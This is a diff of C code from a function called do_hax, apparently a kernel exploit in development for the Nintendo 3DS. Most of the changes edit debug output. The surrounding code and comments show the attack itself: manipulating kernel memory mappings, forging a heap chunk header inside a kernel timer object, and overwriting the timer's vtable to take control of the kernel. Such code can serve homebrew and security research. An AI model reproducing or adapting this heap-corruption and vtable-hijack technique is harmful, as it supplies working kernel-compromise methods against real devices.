@@ -147,20 +147,6 @@ void do_hax() {
     svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
     svcControlMemory(&tmp, memAddr + memSize, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
 
-    // Debug output.
-    printf("Mapping pages for read...\n");
-
-    begin_map_pages(memAddr, memSize);
-    wait_raw_mapped(memAddr);
-    MemChunkHdr hdr = *(MemChunkHdr*) memAddr;
-    wait_map_complete();
-    svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_FREE, MEMPERM_DONTCARE);
-
-    // Debug output.
-    printf("Size: %08X\n", (int) hdr.size);
-    printf("Next: %08X\n", (int) hdr.next);
-    printf("Prev: %08X\n", (int) hdr.prev);
-
     // Create a timer, crafting a fake MemChunkHdr out of its data.
     // Prev does not matter, as any verification happens prior to the overwrite.
     // However, next must be 0, as it does not use size to check when allocation is finished.
@@ -170,12 +156,13 @@ void do_hax() {
     svcCreateTimerKAddr(&timer, 0, &timerAddr);
     svcSetTimer(timer, 0, 0);
 
+    // Retrieve the timer object and create a pointer to our fake header.
     KTimer* timerObj = (KTimer*) (timerAddr - 4);
     MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->timerEnabled;
 
     // Debug output.
     printf("Timer object: 0x%08X\n", (int) timerObj);
-    printf("Fake header address: 0x%08X\n", (int) fakeHdr);
+    printf("Fake header: 0x%08X\n", (int) fakeHdr);
 
     // Allocate a buffer to back up the allocated kernel page before it is cleared by the allocation code.
     //void* backup = malloc(PAGE_SIZE);
@@ -192,8 +179,11 @@ void do_hax() {
 
     // Back up the kernel page before it is cleared.
     //wait_raw_mapped(memAddr + PAGE_SIZE);
-    //printf("Value: %08X\n", *(int*) (memAddr + PAGE_SIZE));
     //memcpy(backup, (void*) (memAddr + PAGE_SIZE), PAGE_SIZE);
+
+    // Debug output.
+    //KTimer* mappedTimerObj = (KTimer*) (memAddr + PAGE_SIZE + ((u32) timerObj & 0xFFF));
+    //printf("VTable: %08X\n", (int) mappedTimerObj->vtable);
 
     // Debug output.
     printf("Post-overwrite control result: 0x%08X\n", (int) control_res);
@@ -203,6 +193,9 @@ void do_hax() {
 
     // Debug output.
     printf("Final control result: 0x%08X\n", (int) control_res);
+
+    // Restore the kernel page backup.
+    //memcpy((void*) (memAddr + PAGE_SIZE), backup, PAGE_SIZE);
 
     // Overwrite the timer's vtable with our own.
     // TODO: This needs to be a kernel virtual address.
